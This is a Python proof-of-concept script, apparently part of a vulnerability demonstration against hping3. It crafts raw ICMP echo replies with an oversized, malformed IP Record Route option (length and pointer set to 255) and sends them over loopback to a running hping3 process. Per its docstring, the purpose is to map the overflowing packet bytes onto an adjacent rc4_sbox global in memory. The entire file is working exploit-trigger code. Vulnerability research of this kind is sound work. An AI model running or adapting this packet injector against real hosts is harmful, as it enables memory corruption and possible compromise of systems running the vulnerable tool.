#!/usr/bin/env python3
"""Loopback-only crafted ICMP echo reply carrying a maximum-length Record Route
option with a *unique, non-periodic* marker.  Used by plain-proof.sh to map
packet bytes to the adjacent rc4_sbox global in the live plain hping3 process.
Traffic stays on 127.0.0.2 -> 127.0.0.1; AF_INET/IP_HDRINCL raw socket.
"""
import argparse
import socket
import struct
import time

from inject_rr import csum

OPT_MARKER = bytes(range(0xA0, 0xA0 + 36))
PAY_MARKER = bytes(range(0x01, 0x41))


def frame(pid, rr_len, ptr):
    ident = pid & 0xFFFF
    icmp = struct.pack("!BBH", 0, 0, 0) + struct.pack("<H", ident) + struct.pack("!H", 0)
    icmp += PAY_MARKER
    icmp = icmp[:2] + struct.pack("!H", csum(icmp)) + icmp[4:]
    opts = bytes([7, rr_len & 0xFF, ptr & 0xFF]) + OPT_MARKER + b"\0"
    assert len(opts) == 40
    total_len = 20 + len(opts) + len(icmp)
    ip = struct.pack("!BBHHHBBH4s4s", 0x4F, 0, total_len, 0x1234, 0, 64, 1, 0,
                     socket.inet_aton("127.0.0.2"), socket.inet_aton("127.0.0.1"))
    ip += opts
    ip = ip[:10] + struct.pack("!H", csum(ip)) + ip[12:]
    return ip + icmp


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--pid", type=int, required=True)
    ap.add_argument("--rr-len", type=int, default=255)
    ap.add_argument("--ptr", type=int, default=255)
    ap.add_argument("--count", type=int, default=3)
    ap.add_argument("--gap", type=float, default=0.15)
    a = ap.parse_args()
    payload = frame(a.pid, a.rr_len, a.ptr)
    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
    s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    try:
        for _ in range(a.count):
            s.sendto(payload, ("127.0.0.1", 0))
            time.sleep(a.gap)
    finally:
        s.close()
    print("injected %d unique-marker frames: rr_len=%d ptr=0x%02x pid=%d" %
          (a.count, a.rr_len, a.ptr, a.pid))


if __name__ == "__main__":
    raise SystemExit(main())
